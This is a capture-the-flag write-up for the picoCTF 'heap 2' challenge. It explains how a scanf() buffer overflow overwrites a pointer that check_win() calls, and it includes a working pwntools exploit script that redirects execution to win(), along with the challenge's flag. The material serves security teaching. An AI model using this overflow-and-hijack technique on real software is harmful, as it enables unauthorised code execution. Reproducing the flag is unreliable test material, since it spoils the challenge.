# heap 2

Can you handle function pointers? Download the binary [here](https://artifacts.picoctf.net/c_mimas/51/chall). Download the source [here](https://artifacts.picoctf.net/c_mimas/51/chall.c).

Looking at the source code, we see that the `check_win()` function is as follows:

```c
void check_win() { ((void (*)())*(int*)x)(); }
```

Ultimately, this treats the value of `x` as an address of a function and then calls that function. In full:

- `(int*)x`: Treat `x` (already declared as `char *x`) as a pointer to an `int`.
- `*(int*)x`: Dereference the `int*` to get the integer value stored at the memory location `x` points to (this value is assumed to be a function address).
- `(void (*)())`: Cast the integer value to a `void (*)()` function pointer type (a pointer to a function that takes any arguments and returns `void`).
- `((void (*)())*(int*)x)()`: Call the function at the address obtained in the previous step.

As we can still overwrite the buffer due to the use of `scanf()`, we can rewrite the contents of `x` with the address of `win()` to get the flag.

Running `objdump`, we see the address of `win()` is `00000000004011a0`.

```
$ objdump -D chall | grep win
00000000004011a0 <win>:
00000000004011f0 <check_win>:
```

We can then use the 32 bytes, followed by this address converted to little endian (reversed):

```python
from pwn import *

p = remote('mimas.picoctf.net', 58912)

p.sendline(b'2')  # Choose option 2 'write to buffer'

p.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00')  # Send payload with address of win() at the end

p.sendline(b'4')  # Choose option 4 'print flag'

p.interactive()
```

```
picoCTF{and_down_the_road_we_go_dbb7ff66}
```